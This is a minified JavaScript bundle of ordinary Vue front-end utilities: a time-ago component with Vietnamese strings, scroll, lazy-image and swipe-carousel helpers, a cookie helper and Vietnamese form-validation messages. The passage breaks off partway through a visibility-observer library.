(function (global,factory){typeof exports ==='object' &&typeof module !=='undefined' ?module.exports =factory():typeof define ==='function' &&define.amd ?define(factory):(global.VueTimeago =factory());}(this,(function (){'use strict';var MINUTE =60;var HOUR =MINUTE *60;var DAY =HOUR *24;var WEEK =DAY *7;var MONTH =DAY *30;var YEAR =DAY *365;var language_timeago_nbr={};language_timeago_nbr['vi']=["vừa rồi","%s giây trước","%s phút trước","%s giờ trước","%s ngày trước","%s tuần trước","%s tháng trước","$s năm trước" ];language_timeago_nbr['en']=["just now",["%s second ago","%s seconds ago"],["%s minute ago","%s minutes ago"],["%s hour ago","%s hours ago"],["%s day ago","%s days ago"],["%s week ago","%s weeks ago"],["%s month ago","%s months ago"],["%s year ago","%s years ago"]];function calcTime(offset){var d =new Date();var utc =d.getTime()+(d.getTimezoneOffset()*60000);var nd =new Date(utc +(3600000*offset));return nd;}function getTimeZone(){var offset =new Date().getTimezoneOffset(),o =Math.abs(offset);return (offset <0 ?"+" :"-")+("00" +Math.floor(o / 60)).slice(-2)+":" +("00" +(o %60)).slice(-2);}function pluralOrSingular(data,locale){if (data ==='just now'){return locale }var count =Math.round(data);if (Array.isArray(locale)){return count >1 ?locale[1].replace(/%s/,count):locale[0].replace(/%s/,count)}return locale.replace(/%s/,count)}function formatTime(time){var d =new Date(time);return d.toLocaleString()}function install( Vue,ref ){if ( ref ===void 0 )ref ={};var name =ref.name;if ( name ===void 0 )name ='timeago';var locale =ref.locale;if ( locale ===void 0 )locale ='en';var locales =ref.locales;if ( locales ===void 0 )locales =language_timeago_nbr;if (!locales ||Object.keys(locales).length ===0){throw new TypeError('Expected locales to have at lease one locale.')};Vue.prototype.$setLangTimeago =function (lang){locale=lang;};var VueTimeago ={props:{since:{required:true },locale:String,maxTime:Number,autoUpdate:Number,format:Function,timezone:String },data:function data(){return {now:new Date().getTime()}},computed:{currentLocale:function currentLocale(){var current =locales[this.locale ||locale];if (!current){return locales[locale]}return current },sinceTime:function sinceTime(){var dateStr=this.since;var a=dateStr.split(" ");var d=a[0].split("-");var t=a[1].split(":");var tempnowfromsv=new Date(d[0],(d[1]-1),d[2],t[0],t[1],t[2]).getTime();return tempnowfromsv;},timeago:function timeago(){if(this.timezone)this.now =calcTime(this.timezone).getTime();var seconds =this.now / 1000 -this.sinceTime / 1000;if (this.maxTime &&seconds >this.maxTime){clearInterval(this.interval);return this.format ?this.format(this.sinceTime):formatTime(this.sinceTime)}var ret =seconds <=5 ?pluralOrSingular('just now',this.currentLocale[0]):seconds <MINUTE ?pluralOrSingular(seconds,this.currentLocale[1]):seconds <HOUR ?pluralOrSingular(seconds / MINUTE,this.currentLocale[2]):seconds <DAY ?pluralOrSingular(seconds / HOUR,this.currentLocale[3]):seconds <WEEK ?pluralOrSingular(seconds / DAY,this.currentLocale[4]):seconds <MONTH ?pluralOrSingular(seconds / WEEK,this.currentLocale[5]):seconds <YEAR ?pluralOrSingular(seconds / MONTH,this.currentLocale[6]):pluralOrSingular(seconds / YEAR,this.currentLocale[7]);return ret }},mounted:function mounted(){if (this.autoUpdate){this.update();}},render:function render(h){return h( 'time',{attrs:{datetime:new Date(this.since)}},this.timeago )},watch:{autoUpdate:function autoUpdate(newAutoUpdate){this.stopUpdate();if (newAutoUpdate){this.update();}}},methods:{update:function update(){var this$1 =this;var period =this.autoUpdate *1000;this.interval =setInterval(function (){if(this$1.timezone)this$1.now =calcTime(this$1.timezone).getTime();else this$1.now =new Date().getTime();},period);},stopUpdate:function stopUpdate(){clearInterval(this.interval);this.interval =null;}},beforeDestroy:function beforeDestroy(){this.stopUpdate();}};Vue.component(name,VueTimeago);}return install;})));(function (){var plugin;plugin =function (Vue){return Vue.directive('keep-scroll-position',{bind:function (el){el.addEventListener('scroll',function (event){event.target.setAttribute('data-vue-keep-scroll-position',event.target.scrollLeft +'-' +event.target.scrollTop);});},update:function (el){if (el.hasAttribute('data-vue-keep-scroll-position')){pos =el.getAttribute('data-vue-keep-scroll-position').split('-');el.scrollLeft =pos[0];el.scrollTop =pos[1];}},inserted:function (el){if (el.hasAttribute('data-vue-keep-scroll-position')){pos =el.getAttribute('data-vue-keep-scroll-position').split('-');el.scrollLeft =pos[0];el.scrollTop =pos[1];}}});};if (typeof Vue !=="undefined" &&Vue !==null){Vue.use(plugin);}if (typeof exports ==='object' &&typeof module ==='object'){return module.exports =plugin;}else if (typeof define ==='function' &&define.amd){return define(function (){return plugin;});}else if (typeof window !=="undefined" &&window !==null){return window.VueKeepScrollPosition =plugin;}})();!function(e,t){if("object"==typeof exports&&"object"==typeof module)module.exports=t();else if("function"==typeof define&&define.amd)define([],t);else{var n=t();for(var r in n)("object"==typeof exports?exports:e)[r]=n[r]}}(this,function(){return function(e){function t(r){if(n[r])return n[r].exports;var i=n[r]={i:r,l:!1,exports:{}};return e[r].call(i.exports,i,i.exports,t),i.l=!0,i.exports}var n={};return t.m=e,t.c=n,t.i=function(e){return e},t.d=function(e,n,r){t.o(e,n)||Object.defineProperty(e,n,{configurable:!1,enumerable:!0,get:r})},t.n=function(e){var n=e&&e.__esModule?function(){return e.default}:function(){return e};return t.d(n,"a",n),n},t.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},t.p="",t(t.s=24)}([function(e,t,n){e.exports=!n(3)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(e,t){e.exports=function(e){return"object"==typeof e?null!==e:"function"==typeof e}},function(e,t){var n=e.exports={version:"2.4.0"};"number"==typeof __e&&(__e=n)},function(e,t){e.exports=function(e){try{return!!e()}catch(e){return!0}}},function(e,t){var n=e.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=n)},function(e,t,n){var r=n(14),i=n(19),o=n(21),u=Object.defineProperty;t.f=n(0)?Object.defineProperty:function(e,t,n){if(r(e),t=o(t,!0),r(n),i)try{return u(e,t,n)}catch(e){}if("get"in n||"set"in n)throw TypeError("Accessors not supported!");return"value"in n&&(e[t]=n.value),e}},function(e,t,n){"use strict";t.__esModule=!0,t.default=function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}},function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}t.__esModule=!0;var i=n(11),o=r(i);t.default=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),(0,o.default)(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}()},function(e,t){},function(e,t){(function(t){e.exports=t}).call(t,{})},function(e,t){e.exports=function(e){if(!e.webpackPolyfill){var t=Object.create(e);t.children||(t.children=[]),Object.defineProperty(t,"loaded",{enumerable:!0,get:function(){return t.l}}),Object.defineProperty(t,"id",{enumerable:!0,get:function(){return t.i}}),Object.defineProperty(t,"exports",{enumerable:!0}),t.webpackPolyfill=1}return t}},function(e,t,n){e.exports={default:n(12),__esModule:!0}},function(e,t,n){n(22);var r=n(2).Object;e.exports=function(e,t,n){return r.defineProperty(e,t,n)}},function(e,t){e.exports=function(e){if("function"!=typeof e)throw TypeError(e+" is not a function!");return e}},function(e,t,n){var r=n(1);e.exports=function(e){if(!r(e))throw TypeError(e+" is not an object!");return e}},function(e,t,n){var r=n(13);e.exports=function(e,t,n){if(r(e),void 0===t)return e;switch(n){case 1:return function(n){return e.call(t,n)};case 2:return function(n,r){return e.call(t,n,r)};case 3:return function(n,r,i){return e.call(t,n,r,i)}}return function(){return e.apply(t,arguments)}}},function(e,t,n){var r=n(1),i=n(4).document,o=r(i)&&r(i.createElement);e.exports=function(e){return o?i.createElement(e):{}}},function(e,t,n){var r=n(4),i=n(2),o=n(15),u=n(18),a="prototype",c=function(e,t,n){var f,s,l,d=e&c.F,p=e&c.G,v=e&c.S,h=e&c.P,y=e&c.B,m=e&c.W,w=p?i:i[t]||(i[t]={}),b=w[a],g=p?r:v?r[t]:(r[t]||{})[a];p&&(n=t);for(f in n)(s=!d&&g&&void 0!==g[f])&&f in w||(l=s?g[f]:n[f],w[f]=p&&"function"!=typeof g[f]?n[f]:y&&s?o(l,r):m&&g[f]==l?function(e){var t=function(t,n,r){if(this instanceof e){switch(arguments.length){case 0:return new e;case 1:return new e(t);case 2:return new e(t,n)}return new e(t,n,r)}return e.apply(this,arguments)};return t[a]=e[a],t}(l):h&&"function"==typeof l?o(Function.call,l):l,h&&((w.virtual||(w.virtual={}))[f]=l,e&c.R&&b&&!b[f]&&u(b,f,l)))};c.F=1,c.G=2,c.S=4,c.P=8,c.B=16,c.W=32,c.U=64,c.R=128,e.exports=c},function(e,t,n){var r=n(5),i=n(20);e.exports=n(0)?function(e,t,n){return r.f(e,t,i(1,n))}:function(e,t,n){return e[t]=n,e}},function(e,t,n){e.exports=!n(0)&&!n(3)(function(){return 7!=Object.defineProperty(n(16)("div"),"a",{get:function(){return 7}}).a})},function(e,t){e.exports=function(e,t){return{enumerable:!(1&e),configurable:!(2&e),writable:!(4&e),value:t}}},function(e,t,n){var r=n(1);e.exports=function(e,t){if(!r(e))return e;var n,i;if(t&&"function"==typeof(n=e.toString)&&!r(i=n.call(e)))return i;if("function"==typeof(n=e.valueOf)&&!r(i=n.call(e)))return i;if(!t&&"function"==typeof(n=e.toString)&&!r(i=n.call(e)))return i;throw TypeError("Can't convert object to primitive value")}},function(e,t,n){var r=n(17);r(r.S+r.F*!n(0),"Object",{defineProperty:n(5).f})},,function(e,t,n){"use strict";(function(e){Object.defineProperty(t,"__esModule",{value:!0});var r=n(6),i=n.n(r),o=n(7),u=n.n(o);n(8);var a=function(){function e(t){var n=this;i()(this,e),this.el=t.el,this.srcError=t.srcError||"",this.lazyClass=t.lazyClass||"lazy",this.removePreview=t.removePreview||!1,this.scale=t.scale||!1,this.EVENTS=["scroll","wheel","mousewheel","resize"],this.Util={throttle:function(e,t){var n=null,r=0;return function(){if(!n){var i=Date.now()-r,o=this,u=arguments,a=function(){r=Date.now(),n=!1,e.apply(o,u)};i>=t?a():n=setTimeout(a,t)}}},on:function(e,t,n){e.addEventListener(t,n)},off:function(e,t,n){e.removeEventListener(t,n)}},this.windowHasBind=!1,this.lazy=this.Util.throttle(function(e){n.fire()},300),this.animationEvent=this.getAnimationEvent()}return u()(e,[{key:"fire",value:function(){this.windowHasBind||(this.windowHasBind=!0,this.events(window,!0));var e=document.querySelectorAll(this.el+" img."+this.lazyClass),t=e.length;if(t>0)for(var n=0;n<t;n++){var r=e[n].getBoundingClientRect();r.top<window.innerHeight&&r.bottom>0&&r.left<window.innerWidth&&r.right>0&&this.loadImage(e[n])}else this.windowHasBind=!1,this.events(window,!1)}},{key:"events",value:function(e,t){var n=this;t?this.EVENTS.forEach(function(t){n.Util.on(e,t,n.lazy)}):this.EVENTS.forEach(function(t){n.Util.off(e,t,n.lazy)})}},{key:"loadImage",value:function(e){var t=this,classremove=this.lazyClass,errorimg=this.srcError,n=new Image;e.dataset&&(e.dataset.srcset&&(n.srcset=e.dataset.srcset),e.dataset.sizes&&(n.sizes=e.dataset.sizes)),n.src=e.dataset.src,n.className="origin",this.scale&&(n.className="origin-scale"),e.classList.remove("lazy"),n.onload=function(r){t.mountImage(e,n)},n.onerror=function(t){e.classList.add("errorll");e.classList.remove(classremove);e.src=errorimg;}}},{key:"getAnimationEvent",value:function(){var e=document.createElement("fake"),t={animation:"animationend",OAnimation:"oAnimationEnd",MozAnimation:"animationend",WebkitAnimation:"webkitAnimationEnd"};for(var n in t)if(void 0!==e.style[n])return t[n]}},{key:"mountImage",value:function(e,t){var n=this,r=e.parentNode;r.appendChild(t).addEventListener(this.animationEvent,function(t){t.target.alt=e.alt||"",e.classList.add("hide"),n.removePreview&&(r.removeChild(e),t.target.classList.remove("origin"),t.target.classList.remove("origin-scale"))})}}]),e}();"undefined"!=typeof exports?(void 0!==e&&e.exports&&(exports=e.exports=a),exports.Progressive=a):"function"==typeof define&&n(9)?define("Progressive",[],function(){return a}):this.Progressive=a}).call(t,n(10)(e))}])});(function(w,d,undefined){'use strict';function polyfill(){if ('scrollBehavior' in d.documentElement.style){return;}var Element =w.HTMLElement ||w.Element;var SCROLL_TIME =468;var original ={scroll:w.scroll ||w.scrollTo,scrollBy:w.scrollBy,elScroll:Element.prototype.scroll ||scrollElement,scrollIntoView:Element.prototype.scrollIntoView };var now =w.performance &&w.performance.now ?w.performance.now.bind(w.performance):Date.now;function scrollElement(x,y){this.scrollLeft =x;this.scrollTop =y;}function ease(k){return 0.5 *(1 -Math.cos(Math.PI *k));}function shouldBailOut(x){if (typeof x !=='object' ||x ===null ||x.behavior ===undefined ||x.behavior ==='auto' ||x.behavior ==='instant'){return true;}if (typeof x ==='object' &&x.behavior ==='smooth'){return false;}throw new TypeError('behavior not valid');}function findScrollableParent(el){var isBody;var hasScrollableSpace;var hasVisibleOverflow;do {el =el.parentNode;isBody =el ===d.body;hasScrollableSpace =el.clientHeight <el.scrollHeight ||el.clientWidth <el.scrollWidth;hasVisibleOverflow =w.getComputedStyle(el,null).overflow ==='visible';}while (!isBody &&!(hasScrollableSpace &&!hasVisibleOverflow));isBody =hasScrollableSpace =hasVisibleOverflow =null;return el;}function step(context){var time =now();var value;var currentX;var currentY;var elapsed =(time -context.startTime)/ SCROLL_TIME;elapsed =elapsed >1 ?1 :elapsed;value =ease(elapsed);currentX =context.startX +(context.x -context.startX)*value;currentY =context.startY +(context.y -context.startY)*value;context.method.call(context.scrollable,currentX,currentY);if (currentX !==context.x ||currentY !==context.y){w.requestAnimationFrame(step.bind(w,context));}}function smoothScroll(el,x,y){var scrollable;var startX;var startY;var method;var startTime =now();if (el ===d.body){scrollable =w;startX =w.scrollX ||w.pageXOffset;startY =w.scrollY ||w.pageYOffset;method =original.scroll;}else {scrollable =el;startX =el.scrollLeft;startY =el.scrollTop;method =scrollElement;}step({scrollable:scrollable,method:method,startTime:startTime,startX:startX,startY:startY,x:x,y:y });}w.scroll =w.scrollTo =function(){if (shouldBailOut(arguments[0])){original.scroll.call( w,arguments[0].left ||arguments[0],arguments[0].top ||arguments[1]);return;}smoothScroll.call( w,d.body,~~arguments[0].left,~~arguments[0].top );};w.scrollBy =function(){if (shouldBailOut(arguments[0])){original.scrollBy.call( w,arguments[0].left ||arguments[0],arguments[0].top ||arguments[1]);return;}smoothScroll.call( w,d.body,~~arguments[0].left +(w.scrollX ||w.pageXOffset),~~arguments[0].top +(w.scrollY ||w.pageYOffset));};Element.prototype.scroll =Element.prototype.scrollTo =function(){if (shouldBailOut(arguments[0])){original.elScroll.call( this,arguments[0].left ||arguments[0],arguments[0].top ||arguments[1]);return;}var left =arguments[0].left;var top =arguments[0].top;smoothScroll.call( this,this,typeof left ==='number' ?left :this.scrollLeft,typeof top ==='number' ?top :this.scrollTop );};Element.prototype.scrollBy =function(){var arg0 =arguments[0];if (typeof arg0 ==='object'){this.scroll({left:arg0.left +this.scrollLeft,top:arg0.top +this.scrollTop,behavior:arg0.behavior });}else {this.scroll( this.scrollLeft +arg0,this.scrollTop +arguments[1]);}};Element.prototype.scrollIntoView =function(){if (shouldBailOut(arguments[0])){original.scrollIntoView.call( this,arguments[0]===undefined ?true :arguments[0]);return;}var scrollableParent =findScrollableParent(this);var parentRects =scrollableParent.getBoundingClientRect();var clientRects =this.getBoundingClientRect();if (scrollableParent !==d.body){smoothScroll.call( this,scrollableParent,scrollableParent.scrollLeft +clientRects.left -parentRects.left,scrollableParent.scrollTop +clientRects.top -parentRects.top );w.scrollBy({left:parentRects.left,top:parentRects.top,behavior:'smooth' });}else {w.scrollBy({left:clientRects.left,top:clientRects.top,behavior:'smooth' });}};}if (typeof exports ==='object'){module.exports ={polyfill:polyfill };}else {polyfill();}})(window,document);(function (root,factory){if (typeof module !=='undefined' &&module.exports){module.exports =factory();}else {root.Swipe =factory();}}(this,function (){'use strict';return function Swipe (container,options){var noop =function(){};var offloadFn =function(fn){setTimeout(fn ||noop,0);};var browser ={addEventListener:!!window.addEventListener,touch:('ontouchstart' in window)||window.DocumentTouch &&document instanceof window.DocumentTouch,transitions:(function(temp){var props =['transitionProperty','WebkitTransition','MozTransition','OTransition','msTransition'];for ( var i in props )if (temp.style[props[i]]!==undefined)return true;return false;})(document.createElement('swipe'))};if (!container)return;var element =container.children[0];var slides,slidePos,width,length;options =options ||{};var index =parseInt(options.startSlide,10)||0;var speed =options.speed ||300;var continuous =options.continuous =options.continuous !==undefined ?options.continuous :true;function setup(){slides =element.children;length =slides.length;continuous =slides.length <2 ?false :options.continuous;if (browser.transitions &&continuous &&slides.length <3){element.appendChild(slides[0].cloneNode(true));element.appendChild(element.children[1].cloneNode(true));slides =element.children;}slidePos =new Array(slides.length);width =container.getBoundingClientRect().width ||container.offsetWidth;element.style.width =(slides.length *width)+'px';var pos =slides.length;while(pos--){var slide =slides[pos];slide.style.width =width +'px';slide.setAttribute('data-index',pos);if (browser.transitions){slide.style.left =(pos *-width)+'px';move(pos,index >pos ?-width :(index <pos ?width :0),0);}}if (continuous &&browser.transitions){move(circle(index-1),-width,0);move(circle(index+1),width,0);}if (!browser.transitions)element.style.left =(index *-width)+'px';container.style.visibility ='visible';}function prev(){if (continuous)slide(index-1);else if (index)slide(index-1);}function next(){if (continuous)slide(index+1);else if (index <slides.length -1)slide(index+1);}function circle(index){return (slides.length +(index %slides.length))%slides.length;}function slide(to,slideSpeed){if (index ==to)return;if (browser.transitions){var direction =Math.abs(index-to)/ (index-to);if (continuous){var natural_direction =direction;direction =-slidePos[circle(to)]/ width;if (direction !==natural_direction)to =-direction *slides.length +to;}var diff =Math.abs(index-to)-1;while (diff--)move( circle((to >index ?to :index)-diff -1),width *direction,0);to =circle(to);move(index,width *direction,slideSpeed ||speed);move(to,0,slideSpeed ||speed);if (continuous)move(circle(to -direction),-(width *direction),0);}else {to =circle(to);animate(index *-width,to *-width,slideSpeed ||speed);}index =to;offloadFn(options.callback &&options.callback(index,slides[index]));}function move(index,dist,speed){translate(index,dist,speed);slidePos[index]=dist;}function translate(index,dist,speed){var slide =slides[index];var style =slide &&slide.style;if (!style)return;style.webkitTransitionDuration =style.MozTransitionDuration =style.msTransitionDuration =style.OTransitionDuration =style.transitionDuration =speed +'ms';style.webkitTransform ='translate(' +dist +'px,0)' +'translateZ(0)';style.msTransform =style.MozTransform =style.OTransform ='translateX(' +dist +'px)';}function animate(from,to,speed){if (!speed){element.style.left =to +'px';return;}var start =+new Date();var timer =setInterval(function(){var timeElap =+new Date()-start;if (timeElap >speed){element.style.left =to +'px';if (delay)begin();options.transitionEnd &&options.transitionEnd.call(event,index,slides[index]);clearInterval(timer);return;}element.style.left =(( (to -from)*(Math.floor((timeElap / speed)*100)/ 100))+from)+'px';},4);}var delay =options.auto ||0;var interval;function begin(){clearTimeout(interval);interval =setTimeout(next,delay);}function stop(){delay =0;clearTimeout(interval);}var start ={};var delta ={};var isScrolling;var events ={handleEvent:function(event){switch (event.type){case 'touchstart':this.start(event);break;case 'touchmove':this.move(event);break;case 'touchend':offloadFn(this.end(event));break;case 'webkitTransitionEnd':case 'msTransitionEnd':case 'oTransitionEnd':case 'otransitionend':case 'transitionend':offloadFn(this.transitionEnd(event));break;case 'resize':offloadFn(setup);break;}if (options.stopPropagation)event.stopPropagation();},start:function(event){var touches =event.touches[0];start ={x:touches.pageX,y:touches.pageY,time:+new Date()};isScrolling =undefined;delta ={};element.addEventListener('touchmove',this,false);element.addEventListener('touchend',this,false);},move:function(event){if ( event.touches.length >1 ||event.scale &&event.scale !==1)return;if (options.disableScroll)event.preventDefault();var touches =event.touches[0];delta ={x:touches.pageX -start.x,y:touches.pageY -start.y };if ( typeof isScrolling =='undefined'){isScrolling =!!( isScrolling ||Math.abs(delta.x)<Math.abs(delta.y));}if (!isScrolling){event.preventDefault();stop();if (continuous){translate(circle(index-1),delta.x +slidePos[circle(index-1)],0);translate(index,delta.x +slidePos[index],0);translate(circle(index+1),delta.x +slidePos[circle(index+1)],0);}else {delta.x =delta.x / ( (!index &&delta.x >0 ||index ==slides.length -1 &&delta.x <0 )?( Math.abs(delta.x)/ width +1 ):1 );translate(index-1,delta.x +slidePos[index-1],0);translate(index,delta.x +slidePos[index],0);translate(index+1,delta.x +slidePos[index+1],0);}options.swiping &&options.swiping(-delta.x / width);}},end:function(event){var duration =+new Date()-start.time;var isValidSlide =Number(duration)<250 &&Math.abs(delta.x)>20 ||Math.abs(delta.x)>width/2;var isPastBounds =!index &&delta.x >0 ||index ==slides.length -1 &&delta.x <0;if (continuous)isPastBounds =false;var direction =delta.x <0;if (!isScrolling){if (isValidSlide &&!isPastBounds){if (direction){if (continuous){move(circle(index-1),-width,0);move(circle(index+2),width,0);}else {move(index-1,-width,0);}move(index,slidePos[index]-width,speed);move(circle(index+1),slidePos[circle(index+1)]-width,speed);index =circle(index+1);}else {if (continuous){move(circle(index+1),width,0);move(circle(index-2),-width,0);}else {move(index+1,width,0);}move(index,slidePos[index]+width,speed);move(circle(index-1),slidePos[circle(index-1)]+width,speed);index =circle(index-1);}options.callback &&options.callback(index,slides[index]);}else {if (continuous){move(circle(index-1),-width,speed);move(index,0,speed);move(circle(index+1),width,speed);}else {move(index-1,-width,speed);move(index,0,speed);move(index+1,width,speed);}}}element.removeEventListener('touchmove',events,false);element.removeEventListener('touchend',events,false);element.removeEventListener('touchforcechange',function(){},false);},transitionEnd:function(event){if (parseInt(event.target.getAttribute('data-index'),10)==index){if (delay)begin();options.transitionEnd &&options.transitionEnd.call(event,index,slides[index]);}}};setup();if (delay)begin();if (browser.addEventListener){if (browser.touch){element.addEventListener('touchstart',events,false);element.addEventListener('touchforcechange',function(){},false);}if (browser.transitions){element.addEventListener('webkitTransitionEnd',events,false);element.addEventListener('msTransitionEnd',events,false);element.addEventListener('oTransitionEnd',events,false);element.addEventListener('otransitionend',events,false);element.addEventListener('transitionend',events,false);}window.addEventListener('resize',events,false);}else {window.onresize =function (){setup();};}return {setup:function(){setup();},slide:function(to,speed){stop();slide(to,speed);},prev:function(){stop();prev();},next:function(){stop();next();},stop:function(){stop();},getPos:function(){return index;},getNumSlides:function(){return length;},kill:function(){stop();element.style.width ='';element.style.left ='';var pos =slides.length;while(pos--){var slide =slides[pos];slide.style.width ='';slide.style.left ='';if (browser.transitions)translate(pos,0,0);}if (browser.addEventListener){element.removeEventListener('touchstart',events,false);element.removeEventListener('webkitTransitionEnd',events,false);element.removeEventListener('msTransitionEnd',events,false);element.removeEventListener('oTransitionEnd',events,false);element.removeEventListener('otransitionend',events,false);element.removeEventListener('transitionend',events,false);window.removeEventListener('resize',events,false);}else {window.onresize =null;}}};};}));Vue.component("nbr-swipe",{template:'<div vswipe><div :class="classswipe"><slot></slot></div></div>',props:{classswipe:{type:String,default:"swipe-wrap"},options:{startSlide:{type:Number,default:0 },speed:{type:Number,default:400 },auto:{type:Number,default:3000 },continuous:{type:Boolean,default:true },disableScroll:{type:Boolean,default:false },stopPropagation:{type:Boolean,default:false },callback:{type:Function,default:null },transitionEnd:{type:Function,default:null }}},data:function(){return{swipe:undefined }},mounted:function(){this.swipe =new Swipe(this.$el,this.options);},methods:{prev:function(){this.swipe.prev()},next:function(){this.swipe.next()},getPos:function (){return this.swipe.getPos()},getNumSlides:function (){return this.swipe.getNumSlides()},slide:function (index,duration){this.swipe.slide(index,duration)},resize:function (){setTimeout(this.swipe.setup,0)}},destroyed:function(){this.swipe.kill();}});Vue.component("nbr-swipeitem",{template:'<div class="swipe-item"><slot></slot></div>' });!function(e,t){"function"==typeof define&&define.amd?define(t):"object"==typeof exports?module.exports=t():e.Cookie=t()}(this,function(){"use strict";function e(e){return e.replace(/[.*+?^$|[\](){}\\-]/g,"\\$&")}function t(e){var t=new Date,n=e.charAt(e.length-1),o=parseInt(e,10);switch(n){case"Y":t.setFullYear(t.getFullYear()+o);break;case"M":t.setMonth(t.getMonth()+o);break;case"D":t.setDate(t.getDate()+o);break;case"h":t.setHours(t.getHours()+o);break;case"m":t.setMinutes(t.getMinutes()+o);break;case"s":t.setSeconds(t.getSeconds()+o);break;default:t=new Date(e)}return t}function n(e){var n="";for(var o in e)if(e.hasOwnProperty(o)){if("expires"===o){var r=e[o];"object"!=typeof r&&(r+="number"==typeof r?"D":"",r=t(r)),e[o]=r.toUTCString()}if("secure"===o){e[o]&&(n+=";"+o);continue}n+=";"+o+"="+e[o]}return e.hasOwnProperty("path")||(n+=";path=/"),n}function o(e,t,n){return void 0===t?o.get(e):void(null===t?o.remove(e):o.set(e,t,n))}return o.enabled=function(){var e,t="__test_key";return document.cookie=t+"=1",e=!!document.cookie,e&&o.remove(t),e},o.get=function(t,n){if("string"!=typeof t||!t)return null;t="(?:^|;)"+e(t)+"(?:=([^;]*?))?(?:;|$)";var o=new RegExp(t),r=o.exec(document.cookie);return null!==r?n?r[1]:decodeURIComponent(r[1]):null},o.getRaw=function(e){return o.get(e,!0)},o.set=function(e,t,o,r){o!==!0&&(r=o,o=!1),r=n(r?r:{});var u=e+"="+(o?t:encodeURIComponent(t))+r;document.cookie=u},o.setRaw=function(e,t,n){o.set(e,t,!0,n)},o.remove=function(e){o.set(e,"a",{expires:new Date})},o});!function(n,t){"object"==typeof exports&&"undefined"!=typeof module?module.exports=t():"function"==typeof define&&define.amd?define(t):(n.__locale__vi=n.__locale__vi||{},n.__locale__vi.js=t())}(this,function(){"use strict";var n={_default:function(n){return"Giá trị của "+n+" không đúng."},after:function(n,t){return n+" phải xuất hiện sau "+t[0]+"."},alpha_dash:function(n){return n+" có thể chứa các kí tự chữ (A-Z a-z),số (0-9),gạch ngang (-)và gạch dưới (_)."},alpha_num:function(n){return n+" chỉ có thể chứa các kí tự chữ và số."},alpha_spaces:function(n){return n+" chỉ có thế chứa các kí tự và khoảng trắng"},alpha:function(n){return n+" chỉ có thể chứa các kí tự chữ."},before:function(n,t){return n+" phải xuất hiện trước "+t[0]+"."},between:function(n,t){return n+" phải có giá trị nằm trong khoảng giữa "+t[0]+" và "+t[1]+"."},confirmed:function(n,t){return n+" khác với "+t[0]+"."},credit_card:function(n){return"Đã điền "+n+" không chính xác."},date_between:function(n,t){return n+" phải có giá trị nằm trong khoảng giữa "+t[0]+" và "+t[1]+"."},date_format:function(n,t){return n+" phải có giá trị dưới định dạng "+t[0]+"."},decimal:function(n,t){void 0===t&&(t=["*"]);var c=t[0];return n+" chỉ có thể chứa các kí tự số và dấu thập phân "+("*"===c?"":c)+"."},digits:function(n,t){return"Trường "+n+" chỉ có thể chứa các kí tự số và bắt buộc phải có độ dài là "+t[0]+"."},dimensions:function(n,t){return n+" phải có chiều rộng "+t[0]+" pixels và chiều cao "+t[1]+" pixels."},email:function(n){return n+" phải là một địa chỉ email hợp lệ."},ext:function(n){return n+" phải là một tệp."},image:function(n){return"Trường "+n+" phải là một ảnh."},in:function(n){return n+" phải là một giá trị."},ip:function(n){return n+" phải là một địa chỉ ip hợp lệ."},max:function(n,t){return n+" không thể có nhiều hơn "+t[0]+" kí tự."},max_value:function(n,t){return n+" phải nhỏ hơn hoặc bằng "+t[0]+"."},mimes:function(n){return n+" phải chứa kiểu tệp phù hợp."},min:function(n,t){return n+" phải chứa ít nhất "+t[0]+" kí tự."},min_value:function(n,t){return n+" phải lớn hơn hoặc bằng "+t[0]+"."},not_in:function(n){return n+" phải chứa một giá trị hợp lệ."},numeric:function(n){return n+" chỉ có thể có các kí tự số."},regex:function(n){return n+" có định dạng không đúng."},required:function(n){return n+" là bắt buộc."},size:function(n,t){return n+" chỉ có thể chứa tệp nhỏ hơn "+t[0]+" KB."},url:function(n){return n+" không phải là một địa chỉ URL hợp lệ."}},t={name:"vi",messages:n,attributes:{}};return"undefined"!=typeof VeeValidate&&VeeValidate&&(VeeValidate.Validator,!0)&&VeeValidate.Validator.addLocale(t),t});!function(root,factory){"object"==typeof exports&&"object"==typeof module?module.exports=factory():"function"==typeof define&&define.amd?define([],factory):"object"==typeof exports?exports.VueObserveVisibility=factory():root.VueObserveVisibility=factory()}(this,function(){return function(modules){function __webpack_require__(moduleId){if(installedModules[moduleId])return installedModules[moduleId].exports;var module=installedModules[moduleId]={i:moduleId,l:!1,exports:{}};return modules[moduleId].call(module.exports,module,module.exports,__webpack_require__),module.l=!0,module.exports}var installedModules={};return __webpack_require__.m=modules,__webpack_require__.c=installedModules,__webpack_require__.i=function(value){return value},__webpack_require__.d=function(exports,name,getter){__webpack_require__.o(exports,name)||Object.defineProperty(exports,name,{configurable:!1,enumerable:!0,get:getter})},__webpack_require__.n=function(module){var getter=module&&module.__esModule?function(){return module.default}:function(){return module};return __webpack_require__.d(getter,"a",getter),getter},__webpack_require__.o=function(object,property){return Object.prototype.hasOwnProperty.call(object,property)},__webpack_require__.p="",__webpack_require__(__webpack_require__.s=2)}([function(module,exports,__webpack_require__){"use strict";function throwValueError(value){if(null!==value&&"function"!=typeof value)throw new Error("observe-visibility directive expects a function as the value")}exports.a={bind:function(el,_ref,vnode){var value=_ref.value;"undefined"==typeof IntersectionObserver?console.warn("[vue-observe-visibility]IntersectionObserver API is not available in your browser.Please install this polyfill:https://github.com/WICG/IntersectionObserver/tree/gh-pages/polyfill"):!function(){throwValueError(value),el._vue_visibilityCallback=value;var observer=el._vue_intersectionObserver=new IntersectionObserver(function(entries){var entry=entries[0];el._vue_visibilityCallback&&el._vue_visibilityCallback.call(null,entry.intersectionRatio>0,entry)});vnode.context.$nextTick(function(){observer.observe(el)})}()},update:function(el,_ref2){var value=_ref2.value;throwValueError(value),el._vue_visibilityCallback=value},unbind:function(el){el._vue_intersectionObserver&&(el._vue_intersectionObserver.disconnect(),delete el._vue_intersectionObserver,delete el._vue_visibilityCallback)}}},function(module,exports){var g,_typeof="function"==typeof 